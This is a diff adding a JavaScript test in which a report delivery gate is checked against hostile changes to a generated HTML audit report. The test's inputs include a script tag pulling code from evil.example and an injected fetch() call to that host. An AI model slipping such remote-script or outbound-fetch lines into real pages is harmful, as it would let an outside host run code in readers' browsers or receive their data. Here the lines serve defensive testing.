@@ -86,3 +86,26 @@ test('the current package passes the neutral identity gate and the executable ve
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /identidade neutra/iu);
 });
+
+test('the report delivery gate rejects executable mutations and a broken no-JS fallback', async () => {
+  const security = await import('../../scripts/verify-report-security.mjs').catch(() => ({}));
+  assert.equal(typeof security.verifyStaticReportSecurity, 'function');
+
+  const [{ SAMPLE_AUDIT }, { renderHtmlReport }, { REPORT_SCRIPT }] = await Promise.all([
+    import('../../fixtures/audits/sample-audit.js'),
+    import('../../src/core/report/html.js'),
+    import('../../src/core/report/report.js.js'),
+  ]);
+  const html = renderHtmlReport(SAMPLE_AUDIT);
+  assert.doesNotThrow(() => security.verifyStaticReportSecurity(html));
+
+  for (const hostile of [
+    html.replace('<script>', '<script src="https://evil.example/runtime.js">'),
+    html.replace('</main>', '<a href="https://evil.example/audit">remoto</a></main>'),
+    html.replace(`<script>${REPORT_SCRIPT}</script>`, `<script>${REPORT_SCRIPT}</script><script>document.write('x')</script>`),
+    html.replace(REPORT_SCRIPT, `${REPORT_SCRIPT}\nfetch('https://evil.example/audit')`),
+    html.replace('id="filter-impact" name="filter-impact" disabled', 'id="filter-impact" name="filter-impact"'),
+  ]) {
+    assert.throws(() => security.verifyStaticReportSecurity(hostile), /relatório|script|CSP|JavaScript|filtro|controle|remot/iu);
+  }
+});
